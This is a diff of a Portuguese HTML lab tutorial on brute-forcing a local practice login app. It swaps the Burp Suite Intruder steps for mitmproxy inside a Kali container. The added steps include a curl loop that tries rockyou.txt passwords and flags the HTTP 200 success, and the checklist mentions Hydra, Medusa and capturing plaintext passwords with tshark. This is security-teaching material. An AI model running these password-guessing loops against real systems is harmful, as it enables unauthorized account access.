@@ -178,7 +178,7 @@
   <div class="nd" data-label="curl"        onclick="goTo('t-curl')"></div>
   <div class="nd" data-label="Hydra"       onclick="goTo('t-hydra')"></div>
   <div class="nd" data-label="Medusa"      onclick="goTo('t-medusa')"></div>
-  <div class="nd" data-label="Burp Suite"  onclick="goTo('t-burp')"></div>
+  <div class="nd" data-label="mitmproxy"   onclick="goTo('t-burp')"></div>
   <div class="nd" data-label="ffuf"        onclick="goTo('t-ffuf')"></div>
   <div class="nd" data-label="Wireshark"   onclick="goTo('t-wire')"></div>
   <div class="nd" data-label="Blue Team"   onclick="goTo('s-blue')"></div>
@@ -375,31 +375,30 @@ ffuf - Fuzz Faster U Fool</pre></div>
     </li>
   </ul>
 
-  <h3>Passo 4 — Instalar o Burp Suite no Windows</h3>
-  <p>O Burp Suite precisa de interface gráfica, então roda diretamente no Windows. O <strong>Wireshark</strong> não precisa ser instalado — usaremos o <strong>tshark</strong> (versão CLI) que já está dentro do container kali-tools.</p>
+  <h3>Passo 4 — Confirmar todas as ferramentas no container</h3>
+  <p>Sem instalações no Windows. Tudo roda dentro do container kali-tools. Verifique de uma vez:</p>
 
   <ul class="steps">
     <li class="si">
       <div class="sn">1</div>
       <div class="sb">
-        <p>Baixar e instalar o Burp Suite Community</p>
-        <div class="box dark"><div class="box-title">🔗 Download</div>
-        <p>Acesse: <strong>https://portswigger.net/burp/communitydownload</strong></p>
-        <p>Baixe a versão <strong>Windows</strong> → execute o instalador → próximo, próximo, instalar.</p></div>
-      </div>
-    </li>
-    <li class="si">
-      <div class="sn">2</div>
-      <div class="sb">
-        <p>Confirmar que o tshark está disponível no container</p>
-        <p>O tshark é o Wireshark em modo linha de comando — captura e analisa pacotes direto no terminal, sem precisar de interface gráfica.</p>
+        <p>Verificar todas as ferramentas de uma vez</p>
         <div class="os-tag win">🪟 PowerShell</div>
         <div class="cb"><div class="ch"><div class="dots"><span></span><span></span><span></span></div><span class="ct">PowerShell</span><button class="cpb" onclick="cp(this)">copiar</button></div>
-        <pre><span class="ps-cmd">docker</span> exec kali-tools tshark <span class="ps-flag">--version</span> 2>&1 | <span class="ps-cmd">Select-String</span> <span class="ps-str">"TShark"</span></pre></div>
+        <pre><span class="ps-cmd">docker</span> exec kali-tools bash <span class="ps-flag">-c</span> <span class="ps-str">"echo '=== Hydra ===' && hydra -h 2>&1 | head -2 && echo '=== ffuf ===' && ffuf -h 2>&1 | head -2 && echo '=== Medusa ===' && medusa -h 2>&1 | head -2 && echo '=== tshark ===' && tshark --version 2>&1 | head -1 && echo '=== mitmproxy ===' && mitmproxy --version 2>&1 | head -1"</span></pre></div>
         <div class="out-block"><div class="out-label">saída esperada</div>
-        <pre>TShark (Wireshark) 4.x.x</pre></div>
-        <div class="box ok"><div class="box-title">✓ tshark disponível — sem precisar instalar nada no Windows</div>
-        <p>Você vai usar o tshark na etapa de análise de tráfego, tudo via <code>docker exec</code> no PowerShell.</p></div>
+        <pre>=== Hydra ===
+Hydra v9.6
+=== ffuf ===
+Fuzz Faster U Fool
+=== Medusa ===
+Medusa v2.x
+=== tshark ===
+TShark (Wireshark) 4.x.x
+=== mitmproxy ===
+mitmproxy 10.x.x</pre></div>
+        <div class="box ok"><div class="box-title">✓ 100% Docker — zero instalações no Windows</div>
+        <p>Todas as ferramentas rodam via <code>docker exec kali-tools</code> no PowerShell. O <strong>mitmproxy</strong> substitui o Burp Suite para interceptação de requisições.</p></div>
       </div>
     </li>
   </ul>
@@ -423,7 +422,7 @@ ffuf - Fuzz Faster U Fool</pre></div>
     <a class="tic tr" href="#t-curl">  <div class="tii">💻</div><div><h5>curl</h5><span>reconhecimento</span></div></a>
     <a class="tic tr" href="#t-hydra"> <div class="tii">🔱</div><div><h5>Hydra</h5><span>bruteforce</span></div></a>
     <a class="tic tr" href="#t-medusa"><div class="tii">🐍</div><div><h5>Medusa</h5><span>bruteforce</span></div></a>
-    <a class="tic tb" href="#t-burp">  <div class="tii">🔍</div><div><h5>Burp Suite</h5><span>intruder</span></div></a>
+    <a class="tic tb" href="#t-burp">  <div class="tii">🔍</div><div><h5>mitmproxy</h5><span>intercepção</span></div></a>
     <a class="tic tr" href="#t-ffuf">  <div class="tii">⚡</div><div><h5>ffuf</h5><span>fuzzing</span></div></a>
     <a class="tic ty" href="#t-wire">  <div class="tii">🦈</div><div><h5>Wireshark</h5><span>tráfego</span></div></a>
   </div>
@@ -604,104 +603,93 @@ Status HTTP: <span class="hit">200</span></pre></div>
 
   <!-- BURP SUITE -->
   <div class="tdiv" id="t-burp">
-    <div class="tbadge"><span class="ti">🔍</span><div><div class="tn">Burp Suite</div><div class="tt">intercepção + intruder — roda no Windows</div></div></div><hr>
+    <div class="tbadge"><span class="ti">🔍</span><div><div class="tn">mitmproxy</div><div class="tt">intercepção HTTP — via container kali</div></div></div><hr>
   </div>
-  <p><strong>O que é:</strong> Suíte de segurança web com proxy e módulo Intruder para automatizar ataques. Roda diretamente no Windows — não precisa de container.</p>
+  <p><strong>O que é:</strong> O mitmproxy é um proxy de intercepção HTTP/HTTPS em modo terminal — faz o mesmo que o Burp Suite, mas 100% via linha de comando dentro do container. Permite capturar, inspecionar e repetir requisições HTTP sem instalar nada no Windows.</p>
 
   <ul class="steps">
     <li class="si">
       <div class="sn">1</div>
       <div class="sb">
-        <p>Abrir o Burp Suite</p>
-        <p>Clique em <strong>"Temporary project"</strong> → <strong>"Use Burp defaults"</strong> → <strong>"Start Burp"</strong>.</p>
+        <p>Entender o conceito de proxy de intercepção</p>
+        <div class="box info"><div class="box-title">💡 O que é um proxy de intercepção?</div>
+        <p>Um proxy fica entre o cliente (seu navegador ou curl) e o servidor. Toda requisição passa por ele antes de chegar ao destino. Isso permite ver, modificar ou repetir qualquer requisição.</p>
+        <p>O mitmproxy funciona exatamente assim — mas no terminal, sem interface gráfica.</p></div>
       </div>
     </li>
 
     <li class="si">
       <div class="sn">2</div>
       <div class="sb">
-        <p>Configurar o Firefox para usar o proxy do Burp</p>
-        <p>Menu (≡) → Configurações → busque "proxy" → Configurações de Conexão → <strong>Configuração manual de proxy</strong>:</p>
-        <div class="box dark"><div class="box-title">⚙ Dados do proxy</div>
-        <p>Proxy HTTP: <code>127.0.0.1</code> &nbsp;&nbsp; Porta: <code>8080</code></p>
-        <p>Marque: <strong>"Usar este proxy para todos os protocolos"</strong> → OK</p></div>
-        <div class="box warn"><div class="box-title">⚠ Lembrete</div>
-        <p>Após terminar, volte e selecione <strong>"Sem proxy"</strong> para restaurar a internet normal.</p></div>
+        <p>Iniciar o mitmproxy no container em modo dump (captura passiva)</p>
+        <p>O <code>mitmdump</code> é a versão não-interativa — imprime todas as requisições no terminal em tempo real:</p>
+        <div class="os-tag win">🪟 PowerShell — janela 1 (proxy)</div>
+        <div class="cb"><div class="ch"><div class="dots"><span></span><span></span><span></span></div><span class="ct">PowerShell — iniciar proxy na porta 8080</span><button class="cpb" onclick="cp(this)">copiar</button></div>
+        <pre><span class="ps-cmd">docker</span> exec <span class="ps-flag">-it</span> kali-tools mitmdump `
+  <span class="ps-flag">--mode</span> regular `
+  <span class="ps-flag">-p</span> 8080 `
+  <span class="ps-flag">--flow-detail</span> 2</pre></div>
+        <div class="out-block"><div class="out-label">saída — proxy aguardando conexões</div>
+        <pre>Proxy server listening at http://*:8080</pre></div>
       </div>
     </li>
 
     <li class="si">
       <div class="sn">3</div>
       <div class="sb">
-        <p>Ativar a interceptação e fazer um login de teste</p>
-        <p>No Burp → aba <strong>Proxy</strong> → clique <strong>"Intercept is off"</strong> para ativar.</p>
-        <p>No Firefox acesse <strong>http://localhost:3000</strong> e tente fazer login com qualquer credencial. O navegador vai "travar" — a requisição está no Burp.</p>
-        <div class="box info"><div class="box-title">💡 Por que travou?</div>
-        <p>O Burp segurou a requisição para você analisar. Clique em <strong>"Forward"</strong> para liberar. Isso é usado para modificar dados em tempo real antes de enviar.</p></div>
+        <p>Enviar uma requisição de login através do proxy</p>
+        <p>Em outra janela do PowerShell, use o curl apontando para o proxy do mitmproxy. O curl envia via proxy, o mitmproxy encaminha para a aplicação e exibe tudo:</p>
+        <div class="os-tag win">🪟 PowerShell — janela 2</div>
+        <div class="cb"><div class="ch"><div class="dots"><span></span><span></span><span></span></div><span class="ct">PowerShell — curl via proxy</span><button class="cpb" onclick="cp(this)">copiar</button></div>
+        <pre><span class="ps-cmd">docker</span> exec kali-tools curl <span class="ps-flag">-s -X POST</span> http://app-brute:3000/login `
+  <span class="ps-flag">-d</span> <span class="ps-str">"username=admin&password=teste123"</span> `
+  <span class="ps-flag">--proxy</span> http://127.0.0.1:8080</pre></div>
+        <div class="out-block"><div class="out-label">o que aparece na janela 1 (mitmproxy)</div>
+        <pre>POST http://app-brute:3000/login
+  <span class="hit">username=admin&password=teste123</span>
+  ← 401 Unauthorized 42b</pre></div>
+        <div class="box info"><div class="box-title">💡 O que você está vendo</div>
+        <p>O mitmproxy está mostrando a requisição completa: método, URL, corpo (com a senha!) e a resposta do servidor. Isso é exatamente o que o Burp Suite Proxy faz.</p></div>
       </div>
     </li>
 
     <li class="si">
       <div class="sn">4</div>
       <div class="sb">
-        <p>Enviar para o Intruder</p>
-        <p>Clique com botão direito na requisição → <strong>"Send to Intruder"</strong> → clique em <strong>"Forward"</strong>.</p>
-        <div class="out-block"><div class="out-label">requisição capturada no Burp</div>
-        <pre>POST /login HTTP/1.1
-Host: localhost:3000
-Content-Type: application/x-www-form-urlencoded
-
-<span class="hit">username=admin&password=teste</span></pre></div>
+        <p>Repetir a mesma requisição com diferentes senhas (replay manual)</p>
+        <p>Agora use o curl em loop para simular o que o Burp Intruder faria — testar várias senhas e observar qual muda a resposta:</p>
+        <div class="os-tag win">🪟 PowerShell — janela 2</div>
+        <div class="cb"><div class="ch"><div class="dots"><span></span><span></span><span></span></div><span class="ct">PowerShell — testar senhas via proxy e observar resposta</span><button class="cpb" onclick="cp(this)">copiar</button></div>
+        <pre><span class="cm"># Testar as primeiras 10 senhas da wordlist via proxy</span>
+<span class="ps-cmd">docker</span> exec kali-tools bash <span class="ps-flag">-c</span> <span class="ps-str">"head -10 /usr/share/wordlists/rockyou.txt | while read pass; do
+  result=\$(curl -s -X POST http://app-brute:3000/login \
+    -d \"username=admin&password=\$pass\" \
+    --proxy http://127.0.0.1:8080 \
+    -w ' | HTTP:%{http_code}')
+  echo \"Senha: \$pass -> \$result\"
+done"</span></pre></div>
+        <div class="out-block"><div class="out-label">saída — note o HTTP:200 quando a senha está certa</div>
+        <pre>Senha: 123456    -> {"success":false} | HTTP:<span class="o">401</span>
+Senha: password  -> {"success":false} | HTTP:<span class="o">401</span>
+Senha: dragon    -> {"success":true}  | HTTP:<span class="hit">200</span>  ← encontrada!
+Senha: 12345     -> {"success":false} | HTTP:<span class="o">401</span></pre></div>
+        <div class="box ok"><div class="box-title">✓ Mesmo conceito do Burp Intruder</div>
+        <p>O Burp Intruder faz exatamente isso de forma visual: testa cada payload da lista e você identifica a resposta diferente pelo tamanho (Length) ou status. Aqui fazemos o mesmo via terminal.</p></div>
       </div>
     </li>
 
     <li class="si">
       <div class="sn">5</div>
       <div class="sb">
-        <p>Configurar os Positions no Intruder</p>
-        <p>Aba <strong>Intruder → Positions</strong> → clique <strong>"Clear §"</strong> → selecione o valor da senha → clique <strong>"Add §"</strong>:</p>
-        <div class="out-block"><div class="out-label">resultado esperado</div>
-        <pre>username=admin&password=<span class="hit">§teste§</span></pre></div>
-        <div class="box info"><div class="box-title">💡 O que são os § §?</div>
-        <p>São marcadores de posição. O Intruder substitui o que estiver entre eles por cada senha da lista — equivalente ao <code>^PASS^</code> do Hydra.</p></div>
-      </div>
-    </li>
+        <p>Salvar todas as requisições em arquivo para análise</p>
+        <div class="os-tag win">🪟 PowerShell — janela 1 (reiniciar mitmproxy com dump em arquivo)</div>
+        <div class="cb"><div class="ch"><div class="dots"><span></span><span></span><span></span></div><span class="ct">PowerShell — salvar fluxos em arquivo</span><button class="cpb" onclick="cp(this)">copiar</button></div>
+        <pre><span class="cm"># Parar o mitmproxy anterior com Ctrl+C, depois rodar com -w para salvar</span>
+<span class="ps-cmd">docker</span> exec <span class="ps-flag">-it</span> kali-tools mitmdump `
+  <span class="ps-flag">--mode</span> regular <span class="ps-flag">-p</span> 8080 `
+  <span class="ps-flag">-w</span> /app/logs/captura.mitm
 
-    <li class="si">
-      <div class="sn">6</div>
-      <div class="sb">
-        <p>Criar uma mini wordlist no Windows para o Burp</p>
-        <p>O rockyou.txt está dentro do container kali-tools. Precisamos extrair as primeiras 200 linhas para o Windows:</p>
-        <div class="os-tag win">🪟 PowerShell</div>
-        <div class="cb"><div class="ch"><div class="dots"><span></span><span></span><span></span></div><span class="ct">PowerShell — exportar mini wordlist do container para o Windows</span><button class="cpb" onclick="cp(this)">copiar</button></div>
-        <pre><span class="cm"># Copiar as primeiras 200 linhas do rockyou.txt para o desktop</span>
-<span class="ps-cmd">docker</span> exec kali-tools bash <span class="ps-flag">-c</span> <span class="ps-str">"head -200 /usr/share/wordlists/rockyou.txt"</span> `
-  | <span class="ps-cmd">Out-File</span> <span class="ps-flag">-Encoding</span> utf8 <span class="ps-str">"$env:USERPROFILE\Desktop\mini.txt"</span>
-
-<span class="cm"># Verificar se foi criado</span>
-<span class="ps-cmd">Get-Content</span> <span class="ps-str">"$env:USERPROFILE\Desktop\mini.txt"</span> | <span class="ps-cmd">Measure-Object</span> <span class="ps-flag">-Line</span></pre></div>
-        <div class="out-block"><div class="out-label">saída esperada</div>
-        <pre>Lines Words Characters Property
------ ----- ---------- --------
-  200</pre></div>
-        <p>Agora no Burp, aba <strong>Payloads</strong> → Payload type: <strong>Simple list</strong> → <strong>Load...</strong> → selecione o arquivo <code>mini.txt</code> do Desktop.</p>
-      </div>
-    </li>
-
-    <li class="si">
-      <div class="sn">7</div>
-      <div class="sb">
-        <p>Iniciar o ataque e analisar pelos Length</p>
-        <p>Clique em <strong>"Start attack"</strong>. Quando terminar, ordene pela coluna <strong>Length</strong> — a linha com tamanho diferente é onde a senha foi encontrada.</p>
-        <div class="out-block"><div class="out-label">exemplo de resultado</div>
-        <pre>Req   Payload     Status  Length
-1     123456      401     42
-2     password    401     42
-3     <span class="hit">dragon      200     68</span>  ← tamanho diferente = login ok!
-4     12345       401     42</pre></div>
-        <div class="box ok"><div class="box-title">✓ Por que o Length é diferente?</div>
-        <p>Login falho → resposta sempre igual → mesmo tamanho (42 bytes).</p>
-        <p>Login ok → mensagem de boas-vindas maior → tamanho diferente (68 bytes).</p></div>
+<span class="cm"># O arquivo ficará em .\logs\captura.mitm na sua máquina Windows</span></pre></div>
       </div>
     </li>
   </ul>
@@ -1173,8 +1161,8 @@ exit</pre></div>
     <li data-id="4"><div class="ck" onclick="chk(4)"></div><span>Hydra: testei threads diferentes e comparei velocidade</span></li>
     <li data-id="5"><div class="ck" onclick="chk(5)"></div><span>Medusa (docker exec): executado e comparado com Hydra</span></li>
     <li data-id="6"><div class="ck" onclick="chk(6)"></div><span>Mini wordlist exportada do container para o Windows</span></li>
-    <li data-id="7"><div class="ck" onclick="chk(7)"></div><span>Burp Suite: proxy configurado e requisição interceptada</span></li>
-    <li data-id="8"><div class="ck" onclick="chk(8)"></div><span>Burp Intruder: senha encontrada pelo Length diferente</span></li>
+    <li data-id="7"><div class="ck" onclick="chk(7)"></div><span>mitmproxy (docker exec): requisição interceptada e senha visível no proxy</span></li>
+    <li data-id="8"><div class="ck" onclick="chk(8)"></div><span>mitmproxy: loop de senhas executado e HTTP 200 identificado</span></li>
     <li data-id="9"><div class="ck" onclick="chk(9)"></div><span>ffuf (docker exec): executado, velocidade comparada</span></li>
     <li data-id="10"><div class="ck" onclick="chk(10)"></div><span>tshark (docker exec): tráfego capturado e senhas lidas em texto claro</span></li>
     <li data-id="11"><div class="ck" onclick="chk(11)"></div><span>Logs analisados com PowerShell: padrão de ataque identificado</span></li>
